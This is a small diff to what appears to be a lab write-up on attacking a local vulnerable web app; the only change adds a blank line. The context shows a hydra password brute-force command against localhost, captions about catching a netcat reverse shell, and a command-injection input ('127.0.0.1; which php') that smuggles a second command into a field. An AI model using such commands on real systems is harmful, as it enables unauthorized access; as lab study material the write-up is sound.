@@ -115,6 +115,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vu
 *Netcat listener receiving reverse shell connection*
 <img width="958" height="642" alt="image" src="https://github.com/user-attachments/assets/b2916b2c-d3c2-45ee-948f-5d3393e3ae7b" />
 *Gaining shell access*
+
 ### Command injection to find php 
 ```
 127.0.0.1; which php
